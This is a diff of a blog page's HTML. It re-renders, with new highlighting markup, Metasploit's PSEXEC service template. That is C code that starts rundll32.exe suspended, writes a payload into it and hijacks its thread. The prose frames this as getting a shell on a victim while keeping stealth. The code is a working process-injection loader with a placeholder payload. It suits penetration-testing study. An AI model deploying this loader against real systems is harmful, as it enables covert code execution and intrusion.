@@ -23,126 +23,125 @@
 &lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;
 &lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;
 &lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define WIN32_LEAN_AND_MEAN
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#define PAYLOAD_SIZE	8192
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cServiceName[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SERVICENAME&amp;#34;&lt;/span&gt;;
-
-&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; bPayload[PAYLOAD_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PAYLOAD:&amp;#34;&lt;/span&gt;;
-
-SERVICE_STATUS ss;
-
-SERVICE_STATUS_HANDLE hStatus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
-
-&lt;span style=&#34;color:#75715e&#34;&gt;/*
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
-BOOL &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceHandler&lt;/span&gt;( DWORD dwControl )
-{
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_STOP &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_SHUTDOWN )
-	{
-		ss.dwWin32ExitCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-		ss.dwCurrentState  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_STOPPED;
-	}
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; SetServiceStatus( hStatus, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss );
-}
-
-&lt;span style=&#34;color:#75715e&#34;&gt;/*
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
-VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD dwNumServicesArgs, LPSTR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; lpServiceArgVectors )
-{
-	CONTEXT Context;
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
-	LPVOID lpPayload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
-
-	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(SERVICE_STATUS) );
-	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO) );
-	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(PROCESS_INFORMATION) );
-
-	si.cb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);
-
-	ss.dwServiceType &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_WIN32_SHARE_PROCESS;
-
-	ss.dwCurrentState &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_START_PENDING;
-
-	ss.dwControlsAccepted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_ACCEPT_STOP&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;SERVICE_ACCEPT_SHUTDOWN;
-
-	hStatus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RegisterServiceCtrlHandler( (LPCSTR)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
-  
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( hStatus )
-	{
-		ss.dwCurrentState &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_RUNNING;
-
-		SetServiceStatus( hStatus, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss );
-
-		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rundll32.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
-		{
-			Context.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
-		  
-			GetThreadContext( pi.hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Context );
-		  
-			lpPayload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;MEM_RESERVE, PAGE_EXECUTE_READWRITE );
-			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( lpPayload )
-			{
-				WriteProcessMemory( pi.hProcess, lpPayload, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bPayload, PAYLOAD_SIZE, NULL );
-&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef _WIN64
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Rip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD64)lpPayload;
-&lt;span style=&#34;color:#75715e&#34;&gt;#else
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)lpPayload;
-&lt;span style=&#34;color:#75715e&#34;&gt;#endif
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				SetThreadContext( pi.hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Context );
-			}
-
-			ResumeThread( pi.hThread );
-			
-			CloseHandle( pi.hThread );
-		  
-			CloseHandle( pi.hProcess );
-		}
-		
-		ServiceHandler( SERVICE_CONTROL_STOP );
-		
-		ExitProcess( &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; );
-	}
-}
-
-&lt;span style=&#34;color:#75715e&#34;&gt;/*
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;WinMain&lt;/span&gt;( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; nCmdShow )
-{
-	SERVICE_TABLE_ENTRY st[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
-    { 
-        { (LPSTR)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ServiceMain }, 
-        { NULL, NULL } 
-    };
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;st );
-}
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define WIN32_LEAN_AND_MEAN
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define PAYLOAD_SIZE	8192
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; cServiceName[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SERVICENAME&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; bPayload[PAYLOAD_SIZE] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PAYLOAD:&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SERVICE_STATUS ss;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SERVICE_STATUS_HANDLE hStatus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOL &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceHandler&lt;/span&gt;( DWORD dwControl )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_STOP &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; dwControl &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; SERVICE_CONTROL_SHUTDOWN )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ss.dwWin32ExitCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ss.dwCurrentState  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_STOPPED;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; SetServiceStatus( hStatus, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;VOID &lt;span style=&#34;color:#a6e22e&#34;&gt;ServiceMain&lt;/span&gt;( DWORD dwNumServicesArgs, LPSTR &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; lpServiceArgVectors )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	CONTEXT Context;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	STARTUPINFO si;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PROCESS_INFORMATION pi;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	LPVOID lpPayload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(SERVICE_STATUS) );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO) );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ZeroMemory( &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(PROCESS_INFORMATION) );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	si.cb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ss.dwServiceType &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_WIN32_SHARE_PROCESS;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ss.dwCurrentState &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_START_PENDING;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	ss.dwControlsAccepted &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_ACCEPT_STOP&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;SERVICE_ACCEPT_SHUTDOWN;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	hStatus &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RegisterServiceCtrlHandler( (LPCSTR)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( hStatus )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ss.dwCurrentState &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SERVICE_RUNNING;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		SetServiceStatus( hStatus, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ss );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( CreateProcess( NULL, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rundll32.exe&amp;#34;&lt;/span&gt;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;si, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;pi ) )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			Context.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			GetThreadContext( pi.hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Context );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			lpPayload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( lpPayload )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				WriteProcessMemory( pi.hProcess, lpPayload, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bPayload, PAYLOAD_SIZE, NULL );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef _WIN64
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Rip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD64)lpPayload;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#else
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				Context.Eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)lpPayload;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				SetThreadContext( pi.hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Context );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			ResumeThread( pi.hThread );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			CloseHandle( pi.hThread );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			CloseHandle( pi.hProcess );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ServiceHandler( SERVICE_CONTROL_STOP );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		ExitProcess( &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;WinMain&lt;/span&gt;( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; nCmdShow )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	SERVICE_TABLE_ENTRY st[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        { (LPSTR)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ServiceMain }, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        { NULL, NULL } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
